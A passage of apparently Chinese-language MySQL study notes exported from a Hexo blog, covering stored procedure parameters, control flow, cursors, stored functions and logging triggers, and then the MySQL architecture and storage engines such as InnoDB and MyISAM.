<li>in:   该参数可以作为输入，也就是需要调用方传入值 , 默认</li>
<li>out:   该参数作为输出，也就是该参数可以作为返回值</li>
<li>inout: 既可以作为输入参数，也可以作为输出参数</li>
</ul>
</blockquote>
<h5 id="in"><a href="#in" class="headerlink" title="in"></a>in</h5><blockquote>
<p><strong>常用于表中已有字段名</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> pro_test6(<span class="keyword">in</span> height <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> description <span class="built_in">varchar</span>(<span class="number">59</span>) <span class="keyword">default</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">if height&gt;= 180 then</span><br><span class="line"><span class="keyword">set</span> description =<span class="string">&#x27;身材高挑&#x27;</span>;</span><br><span class="line">elseif height&gt;=170 and height&lt;180 then</span><br><span class="line"><span class="keyword">set</span> description =<span class="string">&#x27;标准身材&#x27;</span>;</span><br><span class="line">else </span><br><span class="line"><span class="keyword">set</span> description=<span class="string">&#x27;一般身材&#x27;</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">&#x27;身高&#x27;</span>,height,<span class="string">&#x27;对应的身材类型为&#x27;</span>,description);</span><br><span class="line"><span class="keyword">end</span>@</span><br></pre></td></tr></table></figure>

<h5 id="out"><a href="#out" class="headerlink" title="out"></a>out</h5><blockquote>
<p>用于查询表中未有参数，如聚合函数</p>
<ul>
<li><p><strong>select</strong> count(*) <strong>into</strong> <strong>num</strong> from emp;</p>
</li>
<li><p><strong>call sp_emp3(@num)</strong></p>
</li>
<li><p><strong>select @sum</strong></p>
</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建out</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> pro_test6(<span class="keyword">in</span> height <span class="built_in">int</span>,<span class="keyword">out</span> description <span class="built_in">varchar</span>(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">if</span> height&gt;= <span class="number">180</span> <span class="keyword">then</span></span><br><span class="line"><span class="keyword">set</span> description =<span class="string">&#x27;身材高挑&#x27;</span>;</span><br><span class="line">elseif height&gt;=170 and height&lt;180 then</span><br><span class="line"><span class="keyword">set</span> description =<span class="string">&#x27;标准身材&#x27;</span>;</span><br><span class="line">else </span><br><span class="line"><span class="keyword">set</span> description=<span class="string">&#x27;一般身材&#x27;</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 使用聚合函数</span></span><br><span class="line">DELIMITER &amp;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> sp_emp3(<span class="keyword">out</span> <span class="keyword">num</span> <span class="built_in">INT</span>)</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">	<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">into</span> <span class="keyword">num</span> <span class="keyword">from</span> emp;</span><br><span class="line"><span class="keyword">END</span> &amp;</span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 调用</span></span><br><span class="line"><span class="keyword">call</span> pro_test6(<span class="number">180</span>,@description)<span class="comment">#</span></span><br><span class="line"><span class="keyword">select</span> @description<span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span>@<span class="keyword">num</span>=<span class="number">0</span>; <span class="comment">-- 设置全局变量</span></span><br><span class="line"><span class="keyword">call</span> sp_emp3(@<span class="keyword">num</span>);</span><br><span class="line"><span class="keyword">select</span> @<span class="keyword">num</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>@description :  这种变量要在变量名称前面加上“@”符号，叫做<strong>用户会话变量</strong>，代表整个会话过程他都是有作用的，这个类似于全局变量一样。</p>
<p>@@global.sort_buffer_size : 这种在变量前加上 “@@” 符号, 叫做 <strong>系统变量</strong> </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; set @num&#x3D;&#39;hello&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @num;</span><br><span class="line">+-------+</span><br><span class="line">| @num  |</span><br><span class="line">+-------+</span><br><span class="line">| hello |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="case结构"><a href="#case结构" class="headerlink" title="case结构"></a>case结构</h4><blockquote>
<p><strong>语法</strong></p>
<ul>
<li><strong>case</strong>  case_value</li>
</ul>
<p>​     <strong>when</strong>  when_value  <strong>then</strong> statement_list</p>
<p>​     when  when_value2 then statement_list2</p>
<p>​     <strong>else</strong> statement_list3</p>
<p> <strong>end case</strong></p>
<ul>
<li><p>case </p>
<p>​    when 条件表达式 then statement_list</p>
<p>​    when ..</p>
<p>​    else..</p>
<p>end case;</p>
</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> pro_test3(<span class="keyword">in</span> mon <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">result</span> <span class="built_in">varchar</span>(<span class="number">40</span>);</span><br><span class="line">case </span><br><span class="line">when mon&gt;=1 and mon &lt;=3 then</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">result</span>=<span class="string">&#x27;第一季度&#x27;</span>;</span><br><span class="line">when mon&gt;=4 and mon &lt;=6 then</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">result</span>=<span class="string">&#x27;第二季度&#x27;</span>;</span><br><span class="line">when mon&gt;=7 and mon &lt;=9 then</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">result</span>=<span class="string">&#x27;第三季度&#x27;</span>;</span><br><span class="line">else</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">result</span>=<span class="string">&#x27;第四季度&#x27;</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">case</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">&#x27;传递的月份为&#x27;</span>,mon,<span class="string">&#x27;计算出的结果是:&#x27;</span>,<span class="keyword">result</span>); </span><br><span class="line"><span class="keyword">end</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h4 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h4><blockquote>
<p><strong>满足条件继续循环</strong></p>
</blockquote>
<blockquote>
<p><strong>while</strong> search_condition <strong>do</strong></p>
<p>​    statement_list</p>
<p><strong>end while;</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> pro_test4(<span class="keyword">in</span> n <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> total <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">num</span> <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">while num&lt;=n do</span><br><span class="line"><span class="keyword">set</span> total=total+<span class="keyword">num</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">num</span>=<span class="keyword">num</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">while</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">&#x27;num的值&#x27;</span>,<span class="keyword">num</span>,<span class="string">&#x27;total的值&#x27;</span>,total);</span><br><span class="line"><span class="keyword">end</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201019083355334.png" alt="image-20201019083355334" style="zoom:80%;" />

<h4 id="repeat"><a href="#repeat" class="headerlink" title="repeat"></a>repeat</h4><blockquote>
<p><strong>满足条件退出循环</strong></p>
</blockquote>
<blockquote>
<p><strong>repeat</strong></p>
<p>​    statement_list;</p>
<p><strong>until</strong> search_condition（无分号）</p>
<p><strong>end repeat</strong>;</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> pro_test8(<span class="keyword">in</span> n <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> total <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">repeat</span><br><span class="line"><span class="keyword">set</span> total=total+n;</span><br><span class="line"><span class="keyword">set</span> n=n<span class="number">-1</span>;</span><br><span class="line">until n=0</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">repeat</span>;</span><br><span class="line"><span class="keyword">select</span> total;</span><br><span class="line"><span class="keyword">end</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h4 id="loop语句"><a href="#loop语句" class="headerlink" title="loop语句"></a>loop语句</h4><blockquote>
<p>通常使用<strong>leave</strong>语句进行退出</p>
<ul>
<li>loop语句本身无退出条件，故可以进行简单的<strong>死循环</strong></li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> pro_test10(<span class="keyword">in</span> n <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">declare</span> total <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">-- c为循环的别名</span></span><br><span class="line">c:loop</span><br><span class="line"><span class="keyword">set</span> total=total+n;</span><br><span class="line"><span class="keyword">set</span> n=n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- if循环进行判断，实现退出条件</span></span><br><span class="line">if n&lt;0 then</span><br><span class="line">leave c;</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">loop</span> c;</span><br><span class="line"><span class="keyword">select</span> total;</span><br><span class="line"><span class="keyword">end</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h4 id="游标-光标"><a href="#游标-光标" class="headerlink" title="游标/光标"></a>游标/光标</h4><blockquote>
<p>游标是用来存储<strong>查询结果集</strong>的数据类型，在存储过程和函数中可以使用光标对结果集进行循环的处理。</p>
</blockquote>
<p><strong>声明光标</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">declare 游标名 cursor for 查询语句</span><br></pre></td></tr></table></figure>

<p><strong>打开光标</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open 游标名；</span><br></pre></td></tr></table></figure>

<p><strong>获取光标</strong></p>
<blockquote>
<p>调用一次fetch指针向下移动</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fetch 游标名 into 接收数据的变量名</span><br></pre></td></tr></table></figure>

<p><strong>关闭关闭</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">close 游标名;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create procedure pro_test11()</span><br><span class="line">begin</span><br><span class="line">declare e_id int(11);</span><br><span class="line">declare e_name varchar(50);</span><br><span class="line">declare e_age int(11);</span><br><span class="line">declare e_salary int(11);</span><br><span class="line">declare emp_result cursor for select *from emp;</span><br><span class="line"></span><br><span class="line">open emp_result;</span><br><span class="line">fetch emp_result into e_id,e_name,e_age,e_salary;</span><br><span class="line">select concat(&#39;id&#x3D;&#39;,e_id,&#39;,name&#x3D;&#39;,e_name,&#39;,age&#x3D;&#39;,e_age,&#39;,salary&#x3D;&#39;,e_salary);</span><br><span class="line">close emp_result;</span><br><span class="line">end#</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201019091344892.png" alt="image-20201019091344892" style="zoom:80%;" />

<p><strong>循环获取</strong></p>
<blockquote>
<p><strong>declare exit handler for not found set</strong> has_data=0;  光标无结果返回条件。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create procedure pro_test12()</span><br><span class="line">begin</span><br><span class="line">declare e_id int(11);</span><br><span class="line">declare e_name varchar(50);</span><br><span class="line">declare e_age int(11);</span><br><span class="line">declare e_salary int(11);</span><br><span class="line">declare has_data int default 1;</span><br><span class="line"></span><br><span class="line">declare emp_result cursor for select *from emp;</span><br><span class="line">-- 抓取不到数据设置为0,放在游标后面</span><br><span class="line">declare exit handler for not found set has_data&#x3D;0;</span><br><span class="line"></span><br><span class="line">open emp_result;</span><br><span class="line"></span><br><span class="line">repeat</span><br><span class="line">fetch emp_result into e_id,e_name,e_age,e_salary;</span><br><span class="line">select concat(&#39;id&#x3D;&#39;,e_id,&#39;,name&#x3D;&#39;,e_name,&#39;,age&#x3D;&#39;,e_age,&#39;,salary&#x3D;&#39;,e_salary);</span><br><span class="line">until has_data&#x3D;0</span><br><span class="line">end repeat;</span><br><span class="line"></span><br><span class="line">close emp_result;</span><br><span class="line">end#</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201019092152503.png" alt="image-20201019092152503" style="zoom:80%;" />

<h2 id="存储函数function"><a href="#存储函数function" class="headerlink" title="存储函数function"></a>存储函数function</h2><blockquote>
<p>是一个有返回值的存储过程</p>
</blockquote>
<h3 id="创建存储函数"><a href="#创建存储函数" class="headerlink" title="创建存储函数"></a>创建存储函数</h3><blockquote>
<p><strong>create function</strong> function_name()</p>
<p>​    <strong>returns type</strong> (不能加分号)</p>
<p>begin</p>
<p>return 变量</p>
<p>end</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function fun2(countryId int)</span><br><span class="line">returns int</span><br><span class="line"></span><br><span class="line">begin</span><br><span class="line">	declare cnum int;</span><br><span class="line">	select count(*) into cnum from city where country_id&#x3D;countryId;</span><br><span class="line">	return cnum;</span><br><span class="line">end#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select fun1(2)#</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201019093239027.png" alt="image-20201019093239027" style="zoom:80%;" />

<h3 id="删除存储函数"><a href="#删除存储函数" class="headerlink" title="删除存储函数"></a>删除存储函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop function fun2#</span><br></pre></td></tr></table></figure>

<h2 id="触发器"><a href="#触发器" class="headerlink" title="触发器"></a>触发器</h2><blockquote>
<p>与表有关的数据库对象，指在<strong>insert/update/delete</strong>之前或之后，触发并执行触发器中定义的SQL语句集合。</p>
<ul>
<li><p>可以协助应用在数据库确保数据完整性 , 日志记录 , 数据校验等操作 。</p>
</li>
<li><p><strong>触发器还只支持行级触发，不支持语句级触发。</strong></p>
</li>
</ul>
</blockquote>
<table>
<thead>
<tr>
<th>INSERT 型触发器</th>
<th>NEW 表示将要或者已经新增的数据</th>
</tr>
</thead>
<tbody><tr>
<td>INSERT触发器类型</td>
<td>NEW 和 OLD的使用</td>
</tr>
<tr>
<td>UPDATE 型触发器</td>
<td>OLD 表示修改之前的数据 , NEW 表示将要或已经修改后的数据</td>
</tr>
<tr>
<td>DELETE 型触发器</td>
<td>OLD 表示将要或者已经删除的数据</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create trigger trigger_name</span><br><span class="line"></span><br><span class="line">before&#x2F;after insert&#x2F;update&#x2F;delete</span><br><span class="line"></span><br><span class="line">on 表名 </span><br><span class="line"></span><br><span class="line">for each row -- 行级触发器</span><br><span class="line"></span><br><span class="line">begin</span><br><span class="line"></span><br><span class="line">	trigger_stmt ;</span><br><span class="line"></span><br><span class="line">end;</span><br></pre></td></tr></table></figure>

<h3 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h3><blockquote>
<p><strong>创建一张日志表</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table emp_logs(</span><br><span class="line">  id int(11) not null auto_increment,</span><br><span class="line">  operation varchar(20) not null comment &#39;操作类型, insert&#x2F;update&#x2F;delete&#39;,</span><br><span class="line">  operate_time datetime not null comment &#39;操作时间&#39;,</span><br><span class="line">  operate_id int(11) not null comment &#39;操作表的ID&#39;,</span><br><span class="line">  operate_params varchar(500) comment &#39;操作参数&#39;,</span><br><span class="line">  primary key(&#96;id&#96;)</span><br><span class="line">)engine&#x3D;innodb default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure>

<h4 id="insert触发器"><a href="#insert触发器" class="headerlink" title="insert触发器"></a>insert触发器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create trigger emp_logs_insert_trigger</span><br><span class="line">after insert</span><br><span class="line">on emp</span><br><span class="line">for each row</span><br><span class="line">begin</span><br><span class="line">insert into emp_logs(id,operation,operate_time,operate_id,operate_params) values(null,&#39;insert&#39;,now(),new.id,concat(&#39;插入后(id:&#39;,new.id,&#39;,name:&#39;,new.name,&#39;,age:&#39;,new.age,&#39;,salary:&#39;,new.salary,&#39;)&#39;));</span><br><span class="line">end#</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into emp(id,name,age,salary) values(null, &#39;光明左使&#39;,30,3500);</span><br></pre></td></tr></table></figure>

<img src="https://csn.damyoung.cn/image-20201019132216659.png" alt="image-20201019132216659" style="zoom:80%;" />

<h4 id="update触发器"><a href="#update触发器" class="headerlink" title="update触发器"></a>update触发器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create trigger emp_logs_update_trigger</span><br><span class="line">after update </span><br><span class="line">on emp </span><br><span class="line">for each row </span><br><span class="line">begin</span><br><span class="line">insert into emp_logs (id,operation,operate_time,operate_id,operate_params) values(null,&#39;update&#39;,now(),new.id,</span><br><span class="line">concat(&#39;修改前(id:&#39;,old.id,&#39;, name:&#39;,old.name,&#39;, age:&#39;,old.age,&#39;, salary:&#39;,old.salary,&#39;) , </span><br><span class="line">                                                                                                         修改后(id&#39;,new.id, &#39;name:&#39;,new.name,&#39;, age:&#39;,new.age,&#39;, salary:&#39;,new.salary,&#39;)&#39;));                                                                   </span><br><span class="line">end $</span><br></pre></td></tr></table></figure>

<h4 id="delete触发器"><a href="#delete触发器" class="headerlink" title="delete触发器"></a>delete触发器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create trigger emp_logs_delete_trigger</span><br><span class="line">after delete </span><br><span class="line">on emp </span><br><span class="line">for each row </span><br><span class="line">begin</span><br><span class="line">insert into emp_logs (id,operation,operate_time,operate_id,operate_params) values(null,&#39;delete&#39;,now(),old.id,</span><br><span class="line">concat(&#39;删除前(id:&#39;,old.id,&#39;, name:&#39;,old.name,&#39;, age:&#39;,old.age,&#39;, salary:&#39;,old.salary,&#39;)&#39;));                                                                     </span><br><span class="line">end $</span><br></pre></td></tr></table></figure>

<h3 id="查看触发器"><a href="#查看触发器" class="headerlink" title="查看触发器"></a>查看触发器</h3><blockquote>
<p>show triggers 触发器名;</p>
</blockquote>
<h3 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h3><blockquote>
<p>drop trigger 触发器名；</p>
</blockquote>
<p><img src="https://csn.damyoung.cn/image-20200819184051135.png" alt="image-20200819184051135"></p>
<p><img src="https://csn.damyoung.cn/image-20200819180155720.png" alt="image-20200819180155720"></p>
]]></content>
      <categories>
        <category>MySql</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL高级</title>
    <url>/2020/11/11/MySQL%E9%AB%98%E7%BA%A7/</url>
    <content><![CDATA[<h1 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h1><p>整个MySQL Server由以下组成</p>
<ul>
<li>Connection Pool : 连接池组件</li>
<li>Management Services &amp; Utilities : 管理服务和工具组件</li>
<li>SQL Interface : SQL接口组件</li>
<li>Parser : 查询分析器组件</li>
<li>Optimizer : 优化器组件</li>
<li>Caches &amp; Buffers : 缓冲池组件</li>
<li>Pluggable Storage Engines : 存储引擎</li>
<li>File System : 文件系统</li>
</ul>
<a id="more"></a>

<ol>
<li><strong>连接层</strong>：最上层是一些客户端和链接服务，包含本地sock 通信和大多数基于客户端/服务端工具实现的类似于 TCP/IP的通信。主要完成一些类似于连接处理、授权认证、及相关的安全方案。在该层上引入了线程池的概念，为通过认证安全接入的客户端提供线程。同样在该层上可以实现基于SSL的安全链接。服务器也会为安全接入的每个客户端验证它所具有的操作权限。</li>
<li><strong>服务层</strong>：第二层架构主要完成大多数的核心服务功能，如SQL接口，并完成缓存的查询，SQL的分析和优化，部分内置函数的执行。所有跨存储引擎的功能也在这一层实现，如 过程、函数等。在该层，服务器会解析查询并创建相应的内部解析树，并对其完成相应的优化如确定表的查询的顺序，是否利用索引等， 最后生成相应的执行操作。如果是select语句，服务器还会查询内部的缓存，如果缓存空间足够大，这样在解决大量读操作的环境中能够很好的提升系统的性能。</li>
<li><strong>引擎层</strong>：存储引擎层， 存储引擎真正的负责了MySQL中数据的存储和提取，服务器通过API和存储引擎进行通信。不同的存储引擎具有不同的功能，这样我们可以根据自己的需要，来选取合适的存储引擎。</li>
<li><strong>存储层</strong>：数据存储层， 主要是将数据存储在文件系统之上，并完成与存储引擎的交互。</li>
</ol>
<blockquote>
<p>和其他数据库相比，MySQL有点与众不同，它的架构可以在多种不同场景中应用并发挥良好作用。主要体现在存储引擎上，插件式的存储引擎架构，将查询处理和其他的系统任务以及数据的存储提取分离。这种架构可以根据业务的需求和实际需要选择合适的存储引擎。</p>
</blockquote>
<img src="https://csn.damyoung.cn/000001.jpg" style="zoom:80%;" />

<h1 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h1><p>存储引擎就是<strong>存储数据，建立索引，更新查询数据</strong>等等技术的实现方式</p>
<blockquote>
<ul>
<li>针对不同的存储需求可以选择最优的存储引擎。</li>
<li>存储引擎是基于表的，每张表可以使用不同存储引擎</li>
</ul>
</blockquote>
<p>MySQL提供了<strong>插件式</strong>的存储引擎架构。所以MySQL存在多种存储引擎，可以根据需要使用相应引擎，或者编写存储引擎</p>
<blockquote>
<p>MySQL5.0支持的存储引擎包含 ： InnoDB 、MyISAM 、BDB、MEMORY、MERGE、EXAMPLE、NDB Cluster、ARCHIVE、CSV、BLACKHOLE、FEDERATED等</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show engines;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20201019220436964.png"></p>
<h2 id="存储引擎特性"><a href="#存储引擎特性" class="headerlink" title="存储引擎特性"></a>存储引擎特性</h2><table>
<thead>
<tr>
<th>特点</th>
<th>InnoDB</th>
<th>MyISAM</th>
<th>MEMORY</th>
<th>MERGE</th>
<th>NDB</th>
</tr>
</thead>
<tbody><tr>
<td>存储限制</td>
<td>64TB</td>
<td>有</td>
<td>有</td>
<td>没有</td>
<td>有</td>
</tr>
<tr>
<td>事务安全</td>
<td>==支持==</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>锁机制</td>
<td>==行锁(适合高并发)==</td>
<td>==表锁==</td>
<td>表锁</td>
<td>表锁</td>
<td>行锁</td>
</tr>
<tr>
<td>B树索引</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>哈希索引</td>
<td></td>
<td></td>
<td>支持</td>
<td></td>
<td></td>
</tr>
<tr>
<td>全文索引</td>
<td>支持(5.6版本之后)</td>
<td>支持</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>集群索引</td>
<td>支持</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>数据索引</td>
<td>支持</td>
<td></td>
<td>支持</td>
<td></td>
<td>支持</td>
</tr>
<tr>
<td>索引缓存</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
<td>支持</td>
</tr>
<tr>
<td>数据可压缩</td>
<td></td>
<td>支持</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>空间使用</td>
<td>高</td>
<td>低</td>
<td>N/A</td>
<td>低</td>
<td>低</td>
</tr>
<tr>
<td>内存使用</td>
<td>高</td>
<td>低</td>
<td>中等</td>
<td>低</td>
<td>高</td>
</tr>
<tr>
<td>批量插入速度</td>
<td>低</td>
<td>高</td>
<td>高</td>
<td>高</td>
<td>高</td>
</tr>
<tr>
<td>支持外键</td>
<td>==支持==</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><p>InnoDB存储引擎是Mysql的默认存储引擎</p>
<blockquote>
<ul>
<li>InnoDB存储引擎提供了具有提交、回滚、崩溃恢复能力的<strong>事务</strong>安全</li>
<li>支持外键约束</li>
<li>行锁</li>
</ul>
</blockquote>
<h4 id="事务控制"><a href="#事务控制" class="headerlink" title="事务控制"></a>事务控制</h4><blockquote>
<p>在提交事务前，所有都会保存在事务日志中，事务日志得到commit命令才会同步到数据库中。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table goods_innodb(</span><br><span class="line">	id int NOT NULL AUTO_INCREMENT,</span><br><span class="line">	name varchar(20) NOT NULL,</span><br><span class="line">    primary key(id)</span><br><span class="line">)ENGINE&#x3D;innodb DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line">start transaction;</span><br><span class="line">insert into goods_innodb(id,name)values(null,&#39;Meta20&#39;);</span><br><span class="line">commit;</span><br></pre></td></tr></table></figure>

<h4 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h4><p>MySQL支持外键的存储引擎只有InnoDB </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table country_innodb(</span><br><span class="line">	country_id int NOT NULL AUTO_INCREMENT,</span><br><span class="line">    country_name varchar(100) NOT NULL,</span><br><span class="line">    primary key(country_id)</span><br><span class="line">)ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create table city_innodb(</span><br><span class="line">	city_id int NOT NULL AUTO_INCREMENT,</span><br><span class="line">    city_name varchar(50) NOT NULL,</span><br><span class="line">    country_id int NOT NULL,</span><br><span class="line">    primary key(city_id),</span><br><span class="line">    key idx_fk_country_id(country_id),</span><br><span class="line">    CONSTRAINT &#96;fk_city_country&#96; FOREIGN KEY(country_id) REFERENCES country_innodb(country_id) ON DELETE RESTRICT ON UPDATE CASCADE</span><br><span class="line">)ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8;</span><br><span class="line"></span><br><span class="line">--  子表的外键指定是ON DELETE RESTRICT ON UPDATE CASCADE 方式的， 那么在主表删除记录的时候， 如果子表有对应记录， 则不允许删除， 主表在更新记录的时候， 如果子表有对应记录， 则子表对应更新 。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除主表外键：delete from country_innodb where country_id = 1;(失败)</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201019144848845.png" alt="image-20201019144848845" style="zoom:80%;" />

<blockquote>
<p>更新主表外键：update country_innodb set country_id = 100 where country_id = 1;(子表对应记录也会更新)</p>
</blockquote>
<h4 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h4><ul>
<li><p>使用<strong>共享表空间</strong>存储</p>
<ul>
<li>表结构保存在**.frm**文件中</li>
<li>数据和索引保存在 innodb_data_home_dir 和 innodb_data_file_path定义的表空间中，可以是多个文件。</li>
</ul>
</li>
<li><p>使用<strong>多表空间</strong>存储</p>
<ul>
<li>表结构存放 <strong>.frm</strong> 文件</li>
<li>每个表的数据和索引单独保存在 <strong>.ibd</strong> 中。</li>
</ul>
</li>
</ul>
<blockquote>
<p>cd /var/lib/mysql/</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201019162402194.png" alt="image-20201019162402194" style="zoom:80%;" />

<h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><p>不支持事务、也不支持外键，其优势是<strong>访问速度快</strong></p>
<p>对事务的完整性没有要求或者以select、insert为主的应用基本上都可以使用这个引擎来创建表 </p>
<h4 id="不支持事务"><a href="#不支持事务" class="headerlink" title="不支持事务"></a>不支持事务</h4><img src="https://csn.damyoung.cn/image-20201019224019740.png" alt="image-20201019224019740" style="zoom:80%;" />

<img src="https://csn.damyoung.cn/image-20201019224042393.png" alt="image-20201019224042393" style="zoom:80%;" />

<h4 id="文件存储方式"><a href="#文件存储方式" class="headerlink" title="文件存储方式"></a>文件存储方式</h4><blockquote>
<p>.frm (存储表定义)；</p>
<p>.MYD(MYData , 存储数据)；</p>
<p>.MYI(MYIndex , 存储索引)；</p>
</blockquote>
<img src="https://csn.damyoung.cn/image-20201019174007327.png" alt="image-20201019174007327" style="zoom:80%;" />



<h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><p>每个MEMORY表实际对应一个<strong>磁盘文件</strong>，格式是.frm ，该文件中只存储表的结构</p>
<blockquote>
